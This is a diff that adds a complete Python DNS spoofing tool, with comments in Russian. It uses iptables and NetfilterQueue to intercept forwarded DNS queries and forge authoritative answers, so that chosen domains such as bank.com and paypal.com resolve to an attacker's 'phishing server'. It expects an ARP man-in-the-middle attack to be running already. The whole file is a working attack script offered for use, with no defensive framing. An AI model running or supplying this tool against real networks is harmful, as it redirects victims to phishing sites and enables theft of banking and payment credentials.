@@ -1,0 +1,127 @@
+#!/usr/bin/env python3
+import subprocess
+import sys
+import argparse
+import signal
+from scapy.all import (
+IP, UDP, DNS, DNSQR, DNSRR, Ether, conf
+)
+try:
+from netfilterqueue import NetfilterQueue
+except ImportError:
+print("[!] pip install netfilterqueue")
+sys.exit(1)
+conf.verb = 0
+GREEN = "\033[92m"
+RED = "\033[91m"
+YELLOW = "\033[93m"
+CYAN = "\033[96m"
+RESET = "\033[0m"
+# ── Настройка iptables
+────────────────────────────────────────────────────────
+QUEUE_NUM = 1
+def setup_iptables():
+"""Перенаправляем DNS пакеты в netfilter очередь."""
+subprocess.run([
+"iptables", "-I", "FORWARD",
+"-p", "udp", "--dport", "53",
+"-j", "NFQUEUE", "--queue-num", str(QUEUE_NUM)
+], check=True)
+print(f"{GREEN}[+] iptables rule: DNS → NFQUEUE {QUEUE_NUM}{RESET}")
+def cleanup_iptables():
+subprocess.run([
+"iptables", "-D", "FORWARD",
+"-p", "udp", "--dport", "53",
+"-j", "NFQUEUE", "--queue-num", str(QUEUE_NUM)
+], capture_output=True)
+print(f"{YELLOW}[-] iptables rule удалено{RESET}")
+class DNSSpoofHandler:
+def __init__(self, spoof_ip: str, domains: list[str]):
+self.spoof_ip = spoof_ip
+# Нормализуем домены: bank.com → b"bank.com."
+self.domains = {f"{d.rstrip('.')}.".encode() for d in domains}
+self.spoof_count = 0
+def callback(self, packet) -> None:
+"""Callback вызывается для каждого перехваченного DNS пакета."""
+try:
+raw = packet.get_payload()
+pkt = IP(raw)
+# Проверяем: это DNS-запрос?
+if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
+packet.accept()
+return
+# Получаем имя запрашиваемого домена
+queried_domain = pkt[DNSQR].qname # Например: b"bank.com."
+# Проверяем, нужно ли подменять
+should_spoof = any(
+queried_domain.endswith(domain)
+for domain in self.domains
+)
+if not should_spoof:
+packet.accept()
+return
+# Строим поддельный DNS ответ
+spoofed_response = (
+IP(src=pkt[IP].dst, dst=pkt[IP].src) /
+UDP(sport=53, dport=pkt[UDP].sport) /
+DNS(
+id=pkt[DNS].id, # Сохраняем Transaction ID
+qr=1,
+ # 1 = ответ (0 = запрос)
+aa=1,
+ # Authoritative Answer
+qd=pkt[DNS].qd, # Копируем оригинальный вопрос
+an=DNSRR(
+rrname=queried_domain,
+type="A",
+ttl=300,
+rdata=self.spoof_ip
+)
+)
+)
+# Заменяем payload пакета на наш поддельный ответ
+packet.set_payload(bytes(spoofed_response))
+self.spoof_count += 1
+domain_str = queried_domain.decode().rstrip(".")
+print(f"{GREEN}[SPOOF #{self.spoof_count}] "
+f"{pkt[IP].src} → {domain_str} → {self.spoof_ip}{RESET}")
+except Exception as e:
+pass
+packet.accept()
+def main():
+parser = argparse.ArgumentParser(description="DNS Spoofer (requires ARP
+MITM first)")
+parser.add_argument("--ip", required=True,
+help="IP для подмены (наш фишинг-сервер)")
+parser.add_argument("--domains", required=True,
+help="Домены через запятую: bank.com,paypal.com")
+args = parser.parse_args()
+import os
+if os.geteuid() != 0:
+print(f"{RED}[!] Нужен root{RESET}")
+sys.exit(1)
+domains = [d.strip() for d in args.domains.split(",")]
+handler = DNSSpoofHandler(args.ip, domains)
+print(f"{CYAN}[*] DNS Spoofer{RESET}")
+print(f"{CYAN}[*] Поддельный IP: {args.ip}{RESET}")
+print(f"{CYAN}[*] Домены: {domains}{RESET}")
+print(f"{YELLOW}[!] Убедись что ARP Spoofer уже запущен{RESET}")
+print()
+setup_iptables()
+print(f"{GREEN}[+] Ожидаем DNS запросы... Ctrl+C для остановки{RESET}\n")
+nfqueue = NetfilterQueue()
+nfqueue.bind(QUEUE_NUM, handler.callback)
+def signal_handler(sig, frame):
+cleanup_iptables()
+nfqueue.unbind()
+print(f"\n{GREEN}[✓] DNS spoofer остановлен. "
+f"Всего подменено: {handler.spoof_count}{RESET}")
+sys.exit(0)
+signal.signal(signal.SIGINT, signal_handler)
+try:
+nfqueue.run()
+except Exception as e:
+cleanup_iptables()
+print(f"{RED}[!] Ошибка: {e}{RESET}")
+if __name__ == "__main__":
+main()
